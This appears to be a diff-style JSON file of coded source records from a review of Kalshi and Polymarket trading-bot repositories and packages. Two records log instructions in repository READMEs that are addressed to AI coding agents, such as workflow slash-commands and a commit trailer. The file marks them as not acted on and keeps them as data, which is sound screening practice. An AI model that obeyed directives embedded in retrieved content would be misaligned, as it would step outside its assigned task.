+   "outlet_control": "Self-published repository stating a large test count and a production posture; no external moderation or editorial criteria stated.",
+   "expertise": "GitHub handle only; authority and knowledge cannot be determined. Attribute only."
+  },
+  "injection_observed": {
+   "present": true,
+   "kind": "imperative contributor/agent directives inside repository documentation",
+   "verbatim": "2. Use the GSD workflow (see `CLAUDE.md`) for any change. Bug fixes via `/gsd-debug`, features via `/gsd-execute-phase`.",
+   "location": "README.md, contributor-rules list",
+   "assessment": "The README carries an imperative rule list addressed to whoever changes the repository, including a directive to use named slash-commands and a directive to write a specific `Co-Authored-By: Claude Opus 4.7` commit trailer. Addressed to a contributor or coding agent, not to a retrieval agent, and not adversarial in form. NOT ACTED ON, and no linked file was fetched. Recorded as content only."
+  }
+ },
+ {
+  "_host": "github",
+  "_key": "ryohno/polymarket-legend-mm",
+  "id": "ks-sc-026",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/ryohno/polymarket-legend-mm",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T5"
+  ],
+  "F3_contribution_codes": [
+   "K1",
+   "K3"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T5",
+    "quote": "Multi-wallet market-making bot for Polymarket, with a browser dashboard for everything — setup, control, and monitoring.",
+    "location": "README.md, opening paragraph"
+   },
+   {
+    "class": "T5",
+    "quote": "**Not wash trading.** The bot provides legitimate two-sided liquidity and includes hard cross-wallet self-trade prevention. Wash trading is prohibited by Polymarket's ToS and US commodity law.",
+    "location": "README.md, callout block"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; opening paragraphs and callout block",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Polymarket; built for the 'Legend Trade Series' event (8 binary YES/NO markets, NegRisk CTF on Polygon)",
+  "F8_kalshi_specific": "transferred-with-stated-assumption",
+  "F8_carrying_assumption": "The record states it is 'generalizable to any Polymarket event' — a same-venue generalisation only. It states no assumption carrying it to Kalshi, and none is supplied here.",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "self-trade prevention required across wallets",
+    "quote": "includes hard cross-wallet self-trade prevention",
+    "location": "README.md, callout block"
+   },
+   {
+    "precondition": "a rule constraint on the strategy class",
+    "quote": "Wash trading is prohibited by Polymarket's ToS and US commodity law.",
+    "location": "README.md, callout block"
+   },
+   {
+    "precondition": "chain infrastructure and key custody",
+    "quote": "POLYGON_RPC_URL",
+    "location": "README.md, 'Quickstart' prerequisites"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "The quoting rule is stated with neither citation nor in-record derivation. The ToS/law constraint is asserted without citation to the rule document that would carry it (an S-D record). Both gaps recorded.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "quote width and refresh interval",
+   "per-wallet inventory caps (selection procedure: empirical, against measured fill and adverse-selection costs)"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository; no external moderation stated. The record states a compliance constraint on its own strategy class.",
+   "expertise": "GitHub handle only; not determinable. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "ConteurShadow/Polymarket-Market-Maker-Bot",
+  "id": "ks-sc-027",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/ConteurShadow/Polymarket-Market-Maker-Bot",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T5"
+  ],
+  "F3_contribution_codes": [
+   "K1"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T5",
+    "quote": "- **Real-time market making** on Polymarket CLOB (Central Limit Order Book)",
+    "location": "README.md, 'What this bot does'"
+   },
+   {
+    "class": "T5",
+    "quote": "- **Balanced inventory management** with mirrored YES/NO exposure control",
+    "location": "README.md, 'What this bot does'"
+   },
+   {
+    "class": "T5",
+    "quote": "- **Intelligent quote placement** around mid-price using spread (basis points) and orderbook data",
+    "location": "README.md, 'What this bot does'"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; 'What this bot does'",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Polymarket CLOB",
+  "F8_kalshi_specific": "not-transferable-as-stated",
+  "F8_carrying_assumption": "The record states no assumption under which its rules carry to another venue; assigned mechanically from F7.",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "quote refresh cadence",
+    "quote": "- **Optimized cancel/replace** cycles with configurable intervals (aligned with typical taker-delay style timing)",
+    "location": "README.md, 'What this bot does'"
+   },
+   {
+    "precondition": "exposure and sizing limits",
+    "quote": "- **Risk management** — exposure limits, position size caps, and inventory skew checks before placing orders",
+    "location": "README.md, 'What this bot does'"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "The quoting and inventory rules are stated with neither citation nor in-record derivation. Gap recorded.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "the quoted spread in basis points",
+   "the cancel/replace interval",
+   "exposure and position caps (selection procedure: empirical, with the objective and its uncertainty stated)"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository. The record's opening is written in a keyword-dense promotional register, which is a stated observable about its production; recorded as an attribute and not used to weight or rank.",
+   "expertise": "GitHub handle only; not determinable. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "DiegoBermud65/OracleMind-Polymarket-BTC-AI-Probability-Bot",
+  "id": "ks-sc-028",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/DiegoBermud65/OracleMind-Polymarket-BTC-AI-Probability-Bot",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T7",
+   "T3"
+  ],
+  "F3_contribution_codes": [
+   "K1",
+   "K3"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T7",
+    "quote": "**An oracle-aware AI trading system** that estimates true Up/Down probabilities from Chainlink + spot microstructure, compares them to Polymarket implied odds, and only trades when model edge clears fees, slippage, and regime filters.",
+    "location": "README.md, opening blockquote"
+   },
+   {
+    "class": "T3",
+    "quote": "estimates true Up/Down probabilities from Chainlink + spot microstructure",
+    "location": "README.md, opening blockquote — the stated pairing against a settlement-source/oracle series"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; opening blockquote and 'Why OracleMind?'",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Polymarket BTC Up/Down markets at 5m / 15m / 1h horizons",
+  "F8_kalshi_specific": "not-transferable-as-stated",
+  "F8_carrying_assumption": "The record states no assumption carrying it to another venue; assigned mechanically from F7.",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "edge must clear stated cost and regime gates before a trade",
+    "quote": "only trades when model edge clears fees, slippage, and regime filters",
+    "location": "README.md, opening blockquote"
+   },
+   {
+    "precondition": "external oracle and spot data required",
+    "quote": "Chainlink + spot microstructure",
+    "location": "README.md, opening blockquote"
+   },
+   {
+    "precondition": "paper-first operating posture",
+    "quote": "Paper Trading",
+    "location": "README.md, badge row"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "Stated qualitatively — fees and slippage are named as gates — with no figure in the extracted region.",
+   "uncertainty": null,
+   "attribution": "No measured outcome stated in the extracted region."
+  },
+  "F11_attribution_status": "The probability-estimation and edge-gating rules are stated with neither citation nor in-record derivation in the extracted region. Gap recorded.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "the edge threshold above fees and slippage",
+   "the regime-filter definition",
+   "the model's own estimation hyperparameters (selection procedure for all: search with time-ordered, disjoint validation, never in-sample)"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository carrying an explicit keyword list for search placement, which is a stated observable about its production; recorded as an attribute only.",
+   "expertise": "GitHub handle only; not determinable. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "github",
+  "_key": "betcode-org/flumine",
+  "id": "ks-sc-029",
+  "F2_source_class": "S-C",
+  "F2_identifier": "github.com/betcode-org/flumine",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8",
+   "T5"
+  ],
+  "F3_contribution_codes": [
+   "K4",
+   "K1"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "flumine is an open-source, event-based trading framework for sports betting, designed to simplify the development and execution of betting strategies on betting venues. flumine provides efficient handling of data streams, risk management, and execution capabilities.",
+    "location": "README.md, opening paragraph"
+   },
+   {
+    "class": "T8",
+    "quote": "- Event-based Execution: Real-time execution of trading strategies based on incoming market events",
+    "location": "README.md, 'overview'"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; opening paragraph and 'overview'",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Betting exchanges (Betfair, per the project's lineage and its stated sports-betting scope)",
+  "F8_kalshi_specific": "transferred-with-stated-assumption",
+  "F8_carrying_assumption": "The record states a betting-exchange scope. A betting exchange satisfies section 2.2 B-d, but the record states no assumption carrying its framework to a CFTC-regulated event exchange, and none is supplied here.",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "streaming market data required",
+    "quote": "efficient handling of data streams",
+    "location": "README.md, opening paragraph"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated in the extracted region",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "No specific trading rule is stated at framework level; directive 8's obligation is engaged only for strategies a user supplies, not by this record.",
+  "F13_relations": {
+   "note": "Also distributed on PyPI as 'flumine' per the record's own badge; that distribution was not separately drawn into this arm's assessed subset."
+  },
+  "F14_to_compute": [
+   "every strategy parameter: the record supplies an execution framework, not a rule"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Published under a named organisation account with public CI, a coverage badge, a package distribution, and an open community channel — a materially more stated production process than a single-author repository. No editorial peer review.",
+   "expertise": "Organisation is named and its maintainers are publicly identifiable through the project's history; partially determinable. Attribute only, not a stratifier."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "gitlab",
+  "_key": "nayrbryanGaming/arbiter",
+  "id": "ks-sc-030",
+  "F2_source_class": "S-C",
+  "F2_identifier": "gitlab.com/nayrbryanGaming/arbiter",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T1",
+   "T2"
+  ],
+  "F3_contribution_codes": [
+   "K1",
+   "K3"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T1",
+    "quote": "It hunts cross-market arbitrage — no-arbitrage violations\nbetween correlated election and political outcome markets — sizes positions with\nfractional Kelly, and **refuses to place a single trade without a backtested,\nout-of-sample edge.**",
+    "location": "README.md, opening paragraph"
+   },
+   {
+    "class": "T2",
+    "quote": "│   ├── data/         # Polymarket CLOB + Kalshi + Manifold read clients",
+    "location": "README.md, 'Architecture' tree"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; opening paragraph, 'Why This Exists', and 'Architecture'",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Polymarket, stated as the primary venue; the architecture tree also names Kalshi and Manifold read clients",
+  "F8_kalshi_specific": "transferred-with-stated-assumption",
+  "F8_carrying_assumption": "The record names Kalshi only as a read client in its data layer; the arbitrage relation it states is described for political prediction markets with Polymarket named first. No assumption carrying the relation to Kalshi is stated.",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "a validation gate precedes any live trade",
+    "quote": "a modular, test-driven system that earns the right to trade through backtest,\nthen walk-forward validation, then paper observation — before a single dollar\ntouches a real market.",
+    "location": "README.md, 'Why This Exists'"
+   },
+   {
+    "precondition": "default operating mode",
+    "quote": "Default mode is always `PAPER`. Live trading requires\npassing every guard explicitly.",
+    "location": "README.md, opening paragraph"
+   },
+   {
+    "precondition": "sizing discipline",
+    "quote": "sizes positions with\nfractional Kelly",
+    "location": "README.md, opening paragraph"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated in the extracted region",
+   "uncertainty": null,
+   "attribution": "No measured outcome stated. The record's opening blockquote is a self-described boast, quoted below in F15 as an outlet-control observable and adopted as evidence of nothing."
+  },
+  "F11_attribution_status": "'Fractional Kelly' is named as a published method without a citation; the no-arbitrage relation is asserted without an in-record derivation in the extracted region. Both gaps recorded; the corpus may never restate either as established on this record.",
+  "F13_relations": {
+   "note": "Not a duplicate of ks-sc-025 despite the shared project name 'Arbiter': different host, different namespace, different stated venue set, and no twin relation documented by either record (section 4.1)."
+  },
+  "F14_to_compute": [
+   "the Kelly fraction",
+   "the minimum out-of-sample edge that opens the live gate",
+   "the correlation criterion defining 'correlated' markets (selection procedure for all: empirical estimation with a stated objective and uncertainty, never a hand-set constant)"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository. Its README opens with a first-person superlative blockquote ('This is the best political-market quant bot ever created — nobody does arbitrage like this. Nobody.') while its body states a conservative validation gate; the tension is recorded as a production observable and is NOT used to weight or rank the record.",
+   "expertise": "GitLab handle only; authority and knowledge cannot be determined. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "gitlab",
+  "_key": "kandadamukesh8/alphaedge",
+  "id": "ks-sc-031",
+  "F2_source_class": "S-C",
+  "F2_identifier": "gitlab.com/kandadamukesh8/alphaedge",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T7",
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4",
+   "K3"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "**AlphaEdge** is a paper-trading prediction market **simulation** for NBA, broader sports, and election markets. It combines a real central limit order book (CLOB), sports/election fixtures, XGBoost modeling, LangGraph agents, risk controls, and continuous evaluation (Brier, calibration, drift).",
+    "location": "README.md, opening paragraph"
+   },
+   {
+    "class": "T7",
+    "quote": "XGBoost modeling, LangGraph agents",
+    "location": "README.md, opening paragraph"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; opening paragraph and disclaimer block",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "none/theoretical — the record states it is a simulation with its own seeded order book, not a live venue",
+  "F8_kalshi_specific": "not-transferable-as-stated",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "simulated funds only, enforced by configuration",
+    "quote": "`PAPER_TRADING_ONLY=true` is required.",
+    "location": "README.md, disclaimer block"
+   },
+   {
+    "precondition": "orders cannot originate from model text",
+    "quote": "Orders flow only through `RiskService` → validated `OrderIntent` → `OrderBookService` — never from raw LLM text.",
+    "location": "README.md, 'Safety' block"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": "The record names Brier score, calibration, and drift as its continuous-evaluation metrics but states no value in the extracted region.",
+   "attribution": "No measured outcome stated."
+  },
+  "F11_attribution_status": "XGBoost and Brier scoring are named as published methods without citations; no trading rule is stated. Gap recorded.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "XGBoost hyperparameters",
+   "the risk-control limits (selection procedure: empirical, with time-ordered validation for a time-series task)"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository stating an explicit paper-only constraint and an architectural safety invariant; no external moderation stated.",
+   "expertise": "GitLab handle only; not determinable. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "gitlab",
+  "_key": "ciberhands/claude-for-polymarket-bots",
+  "id": "ks-sc-032",
+  "F2_source_class": "S-C",
+  "F2_identifier": "gitlab.com/ciberhands/claude-for-polymarket-bots",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "A comprehensive Claude Code configuration for building Polymarket prediction market trading bots. This project provides specialized agents, skills, and commands that enable Claude Code to research, scaffold, and audit trading bots with deep knowledge of Polymarket's APIs.",
+    "location": "README.md, opening paragraph"
+   },
+   {
+    "class": "T8",
+    "quote": "- **Skills**: On-demand knowledge modules (fee calculations, crypto market mechanics)",
+    "location": "README.md, 'What This Project Does'"
+   }
+  ],
+  "F5_evidence_location": "README.md at pinned commit; opening paragraph and 'What This Project Does'",
+  "F6_extraction_depth": "README-and-metadata",
+  "F7_venue_of_establishment": "Polymarket",
+  "F8_kalshi_specific": "not-transferable-as-stated",
+  "F8_carrying_assumption": "The record states Polymarket-specific API knowledge and no assumption carrying it elsewhere.",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "the tooling names fee calculation as a knowledge module it supplies",
+    "quote": "On-demand knowledge modules (fee calculations, crypto market mechanics)",
+    "location": "README.md, 'What This Project Does'"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "No trading rule stated; directive 8 not engaged for this record. Note that a record whose output is generated strategy code creates a downstream attribution hazard — a rule produced by it would carry no citation — which is recorded here as a finding about the record class, not as a rule.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "none from this record: it states a code-generation configuration, not a rule"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Self-published repository; no external moderation stated.",
+   "expertise": "GitLab handle only; not determinable. Attribute only."
+  },
+  "injection_observed": {
+   "present": true,
+   "kind": "repository whose entire content is instructions addressed to an AI coding agent",
+   "verbatim": "When you use Claude Code in this directory, it gains the ability to build complete, working Polymarket trading bots through a structured research → scaffold → audit pipeline.",
+   "location": "README.md, 'What This Project Does'",
+   "assessment": "The repository's stated purpose is to supply agent instructions, skills, and slash-commands to a coding agent operating in its directory. Descriptive of its own design rather than adversarial, and not addressed to a retrieval agent. NOT ACTED ON: nothing was installed, cloned, or executed, and no agent-configuration file in the repository was fetched or loaded. Recorded as content only, per the arm's frozen constraint."
+  }
+ },
+ {
+  "_host": "pypi",
+  "_key": "kalshi-python",
+  "id": "ks-sc-033",
+  "F2_source_class": "S-C",
+  "F2_identifier": "pypi.org/project/kalshi-python 2.1.4",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "Kalshi Trading API",
+    "location": "PyPI JSON API, info.summary field for kalshi-python 2.1.4"
+   }
+  ],
+  "F5_evidence_location": "PyPI JSON API /pypi/kalshi-python/json, info.summary; package-name and description fields only, per section 3.2",
+  "F6_extraction_depth": "metadata",
+  "F7_venue_of_establishment": "Kalshi",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "licence restricts reuse",
+    "quote": "LicenseRef-Proprietary",
+    "location": "PyPI JSON API, info.license_expression — the only package-index record in this subset with a non-open declared licence"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "No trading rule stated; directive 8 not engaged.",
+  "F13_relations": {
+   "note": "The GitHub record ks-sc-014 (bennapp/kalshi-sdk) instructs installation of this package name."
+  },
+  "F14_to_compute": [
+   "none from this record: it states an interface, not a rule"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Distributed through a package index with an automated publication process and no content review. The summary asserts the venue's own API name; the record's relation to the venue is not established at the depth retrieved.",
+   "expertise": "Not determinable from the package-index fields alone. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "pypi",
+  "_key": "kalshi",
+  "id": "ks-sc-034",
+  "F2_source_class": "S-C",
+  "F2_identifier": "pypi.org/project/kalshi 0.2.0",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "Library for accessing Kalshi API",
+    "location": "PyPI JSON API, info.summary field for kalshi 0.2.0"
+   }
+  ],
+  "F5_evidence_location": "PyPI JSON API /pypi/kalshi/json, info.summary",
+  "F6_extraction_depth": "metadata",
+  "F7_venue_of_establishment": "Kalshi",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "none stated in the package-index fields",
+    "quote": null,
+    "location": "info.summary states none"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "No trading rule stated; directive 8 not engaged.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "none from this record"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Package index, automated publication, no content review.",
+   "expertise": "Not determinable from package-index fields. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "pypi",
+  "_key": "kalshi-sdk",
+  "id": "ks-sc-035",
+  "F2_source_class": "S-C",
+  "F2_identifier": "pypi.org/project/kalshi-sdk 13.0.0",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "A professional Python SDK for the Kalshi prediction markets and Perps (marg",
+    "location": "PyPI JSON API, info.summary field for kalshi-sdk 13.0.0, as returned (the platform's summary field is truncated at this length in the retrieved payload)"
+   }
+  ],
+  "F5_evidence_location": "PyPI JSON API /pypi/kalshi-sdk/json, info.summary",
+  "F6_extraction_depth": "metadata",
+  "F7_venue_of_establishment": "Kalshi prediction markets, and a margined 'Perps' product the summary names",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "the summary names a margined perpetual product alongside the event markets",
+    "quote": "Kalshi prediction markets and Perps (marg",
+    "location": "info.summary — recorded because a margined continuous-payoff product would fail section 2.2 B-a on its own; the record is in scope for the event-market half it names"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "No trading rule stated; directive 8 not engaged.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "none from this record"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Package index, automated publication, no content review. The summary's 'professional' is a self-description and is recorded as such, not as an attribute of quality.",
+   "expertise": "Not determinable from package-index fields. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "pypi",
+  "_key": "py-clob-client",
+  "id": "ks-sc-036",
+  "F2_source_class": "S-C",
+  "F2_identifier": "pypi.org/project/py-clob-client 0.34.6",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "Python client for the Polymarket CLOB",
+    "location": "PyPI JSON API, info.summary field for py-clob-client 0.34.6"
+   }
+  ],
+  "F5_evidence_location": "PyPI JSON API /pypi/py-clob-client/json, info.summary",
+  "F6_extraction_depth": "metadata",
+  "F7_venue_of_establishment": "Polymarket CLOB",
+  "F8_kalshi_specific": "not-transferable-as-stated",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "none stated in the package-index fields",
+    "quote": null,
+    "location": "info.summary states none"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "No trading rule stated; directive 8 not engaged.",
+  "F13_relations": {
+   "note": "Several npm records in this subset and several GitHub records name a Polymarket CLOB client of this kind as a dependency."
+  },
+  "F14_to_compute": [
+   "none from this record"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Package index, automated publication, no content review.",
+   "expertise": "Not determinable from package-index fields. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "pypi",
+  "_key": "polymarket-sdk",
+  "id": "ks-sc-037",
+  "F2_source_class": "S-C",
+  "F2_identifier": "pypi.org/project/polymarket-sdk 0.2.0",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "Polymarket trading client and market data fetcher",
+    "location": "PyPI JSON API, info.summary field for polymarket-sdk 0.2.0"
+   }
+  ],
+  "F5_evidence_location": "PyPI JSON API /pypi/polymarket-sdk/json, info.summary",
+  "F6_extraction_depth": "metadata",
+  "F7_venue_of_establishment": "Polymarket",
+  "F8_kalshi_specific": "not-transferable-as-stated",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "none stated in the package-index fields",
+    "quote": null,
+    "location": "info.summary states none"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "No trading rule stated; directive 8 not engaged.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "none from this record"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Package index, automated publication, no content review.",
+   "expertise": "Not determinable from package-index fields. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "pypi",
+  "_key": "polymarket",
+  "id": "ks-sc-038",
+  "F2_source_class": "S-C",
+  "F2_identifier": "pypi.org/project/polymarket 0.1.2",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "A package to export historical odds for an outcome of a market on Polymarke",
+    "location": "PyPI JSON API, info.summary field for polymarket 0.1.2, as returned (the retrieved summary is truncated at this length)"
+   }
+  ],
+  "F5_evidence_location": "PyPI JSON API /pypi/polymarket/json, info.summary",
+  "F6_extraction_depth": "metadata",
+  "F7_venue_of_establishment": "Polymarket",
+  "F8_kalshi_specific": "not-transferable-as-stated",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "historical odds export is the stated capability, which is a data-availability statement",
+    "quote": "export historical odds for an outcome of a market",
+    "location": "info.summary"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "No trading rule stated; directive 8 not engaged.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "none from this record"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Package index, automated publication, no content review. No declared licence in the retrieved metadata.",
+   "expertise": "Not determinable from package-index fields. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "npm",
+  "_key": "kalshi-cli",
+  "id": "ks-sc-039",
+  "F2_source_class": "S-C",
+  "F2_identifier": "registry.npmjs.org/kalshi-cli 1.2.78",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "Interactive CLI for trading prediction markets on Kalshi",
+    "location": "npm registry search result, package.description for kalshi-cli 1.2.78"
+   }
+  ],
+  "F5_evidence_location": "npm registry REST /-/v1/search, objects[].package.description; package name, description and keyword fields only, per section 3.2",
+  "F6_extraction_depth": "metadata",
+  "F7_venue_of_establishment": "Kalshi",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
+    "precondition": "none stated in the package-index fields",
+    "quote": null,
+    "location": "package.description states none"
+   }
+  ],
+  "F10_outcome_reported": {
+   "reports_outcome": false,
+   "verbatim": null,
+   "data_span": null,
+   "cost_treatment": "not stated",
+   "uncertainty": null,
+   "attribution": "No outcome stated."
+  },
+  "F11_attribution_status": "No trading rule stated; directive 8 not engaged.",
+  "F13_relations": {},
+  "F14_to_compute": [
+   "none from this record"
+  ],
+  "F15_grey_credibility": {
+   "outlet_control": "Package index, automated publication, no content review. A source repository link is declared in the registry metadata.",
+   "expertise": "Not determinable from package-index fields. Attribute only."
+  },
+  "injection_observed": null
+ },
+ {
+  "_host": "npm",
+  "_key": "kalshi-typescript",
+  "id": "ks-sc-040",
+  "F2_source_class": "S-C",
+  "F2_identifier": "registry.npmjs.org/kalshi-typescript 3.29.0",
+  "F2_persistent_identifier": "none",
+  "F3_strategy_class": [
+   "T8"
+  ],
+  "F3_contribution_codes": [
+   "K4"
+  ],
+  "F4_evidence_quotes": [
+   {
+    "class": "T8",
+    "quote": "OpenAPI client for kalshi-typescript",
+    "location": "npm registry search result, package.description for kalshi-typescript 3.29.0"
+   }
+  ],
+  "F5_evidence_location": "npm registry REST /-/v1/search, objects[].package.description",
+  "F6_extraction_depth": "metadata",
+  "F7_venue_of_establishment": "Kalshi, by the package name; the description names no venue of its own",
+  "F8_kalshi_specific": "kalshi-specific",
+  "F9_preconditions_stated": [
+   {
